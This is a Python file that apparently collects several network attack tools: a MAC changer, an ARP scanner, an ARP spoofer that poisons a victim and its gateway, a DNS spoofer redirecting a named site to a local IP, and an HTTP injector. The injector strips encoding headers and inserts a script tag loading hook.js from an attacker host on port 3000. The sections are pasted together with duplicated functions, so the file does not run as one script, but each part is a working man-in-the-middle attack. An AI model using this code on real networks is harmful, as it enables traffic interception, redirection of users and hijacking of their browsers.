#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
import re
import time
import sys

### mac_changer ###
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--nic", dest="nic", help="Network Interface Card name")
    parser.add_argument("-m", "--mac", dest="new_mac", help="New MAC-address")
    options = parser.parse_args()
    if not options.nic:
        parser.error("Please, specify a NIC, use --help for more info")
    elif not options.new_mac:
        parser.error("Please, specify a MAC, use --help for more info")
    return options

def change_mac(nic, new_mac):
    print("Changing MAC-address for " + nic + " to " + new_mac + "\n...")
    subprocess.call(["ifconfig", nic, "down"])
    subprocess.call(["ifconfig", nic, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", nic, "up"])

def get_current_mac(nic):
    ifconfig_result = subprocess.check_output(["ifconfig", nic])
    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
    if mac_address_search_result:
        return mac_address_search_result.group(0)
    else:
        print("WARNING! Could not read the MAC-address")

options = get_args()
current_mac = get_current_mac(options.nic)
print("Current MAC-address is " + str(current_mac))
if not current_mac == options.new_mac:
    change_mac(options.nic, options.new_mac)
    current_mac = get_current_mac(options.nic)
    if current_mac == options.new_mac:
        print("SUCCESS! MAC-address changed successfully!")
        print("Your new MAC-address is " + str(current_mac))
    else:
        print("WARNING! MAC-address didn't change!")
else:
    print("WARNING! New MAC-address is the same as the current MAC-address")
### /mac_changer ###

### network_scanner ###
def get_cidr():
    result = subprocess.check_output(["ip", "route"])
    cidr = re.search(r"([1-9]|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])(\.(\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])){3}\/\d+", str(result))
    return cidr.group(0)

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        clients_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(clients_dict)
    return clients_list

def print_result(results_list):
    print("IP\t\tMAC-address\n---------------------------------")
    for element in results_list:
        print(element["ip"] + "\t" + element["mac"])

cidr_result = get_cidr()
scan_result = scan(cidr_result)
print_result(scan_result)
### /network_scanner ###

### arp_spoof ###
def linux_presettings():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="victim IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please, specify a target IP, use --help for more info")
    return options

def get_gateway_ip():
    result = subprocess.check_output(["ip", "route"])
    gateway_ip = re.search(r"(?<=via ).*(?= dev)", str(result))
    return gateway_ip.group(0)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

linux_presettings()
gateway_ip = get_gateway_ip()
target_ip = get_args().target_ip

sent_packets_count = 0
measure = 0
print("Packets sent\tSeconds passed\n------------------------------")
start = time.time()
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        measure = time.time() - start
        print("\r" + str(sent_packets_count) + "\t\t" + str(measure)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Resetting ARP-tables... Please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP-tables were resetting successfully!")
except BaseException:
    print("WARNING! Something get wrong!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP-tables were resetting successfully!")
### /arp_spoof ###

### dns_spoof ###
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "seasonvar.ru" in qname:
            print("Spoofing: " + qname)
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()

options = get_args()
presets_for_intercept_and_modify_packets(options)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue_num), process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
    flush_presets()
    print("IP-tables were flushing successfully!")
### /dns_spoof ###

http_ports = [80, 8080, 8008, 8000]

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def set_load_data(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport in http_ports:
            print("Request")
            # print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport in http_ports:
            print("Response")
            # print(scapy_packet.show())
            injection_code = "<script src='http://10.0.2.15:3000/hook.js'></script>"
            load = load.replace("</head>", injection_code + "</head>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                content_length_header = "Content-Length: "
                load = load.replace(content_length_header + content_length, content_length_header + str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load_data(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

options = get_args()
presets_for_intercept_and_modify_packets(options)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue_num), process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
    flush_presets()
    print("IP-tables were flushing successfully!")
except BaseException:
    print("WARNING! Something get wrong!")
    flush_presets()
    print("IP-tables were flushing successfully!")
